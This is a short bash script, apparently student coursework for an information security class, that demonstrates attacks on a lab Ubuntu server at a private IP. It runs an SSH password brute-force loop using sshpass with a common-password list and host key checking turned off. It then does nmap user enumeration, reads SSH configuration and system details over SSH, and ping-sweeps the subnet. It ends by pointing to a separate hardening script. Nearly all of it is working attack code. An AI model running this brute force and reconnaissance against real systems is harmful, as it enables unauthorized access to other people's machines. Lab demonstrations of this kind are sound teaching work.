#!/bin/bash

# Script de Demonstração de Vulnerabilidades
# Trabalho Final - Segurança da Informação

TARGET_IP="192.168.3.216"  # IP da máquina vítima (Ubuntu Server)
USERNAME="professor"

echo "=== DEMONSTRAÇÃO DE VULNERABILIDADES ==="
echo "Target: $TARGET_IP"
echo "Username: $USERNAME"
echo ""

# Vulnerabilidade 1: SSH Brute Force
echo "[1] Demonstrando ataque de força bruta SSH..."
echo "Testando senhas comuns..."

# Lista de senhas comuns
passwords=("123456" "password" "admin" "root" "123123" "qwerty")

for password in "${passwords[@]}"; do
    echo "Tentando senha: $password"
    sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
        $USERNAME@$TARGET_IP "echo 'Acesso obtido com senha: $password'" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[SUCESSO] Senha encontrada: $password"
        break
    fi
done

echo ""

# Vulnerabilidade 2: Enumeração de usuários
echo "[2] Enumeração de usuários SSH..."
nmap --script ssh-enum-users --script-args ssh-enum-users.checkall=true $TARGET_IP

echo ""

# Vulnerabilidade 3: Verificação de configuração SSH
echo "[3] Analisando configuração SSH..."
ssh $USERNAME@$TARGET_IP "cat /etc/ssh/sshd_config | grep -E '(PermitRootLogin|PasswordAuthentication|PermitEmptyPasswords)'"

echo ""

# Vulnerabilidade 4: Coleta de informações do sistema
echo "[4] Coletando informações do sistema..."
ssh $USERNAME@$TARGET_IP "uname -a; cat /etc/os-release; ps aux | head -10"

echo ""

# Vulnerabilidade 5: Verificação de logs
echo "[5] Verificando configuração de logs..."
ssh $USERNAME@$TARGET_IP "ls -la /var/log/ | grep -E '(auth|secure|syslog)'"

echo ""

# Vulnerabilidade 6: Análise de rede
echo "[6] Analisando segmentação de rede..."
nmap -sn 192.168.3.0/24 | grep "Nmap scan report"

echo ""
echo "=== DEMONSTRAÇÃO CONCLUÍDA ==="
echo "IMPORTANTE: Execute o script de hardening para corrigir as vulnerabilidades!"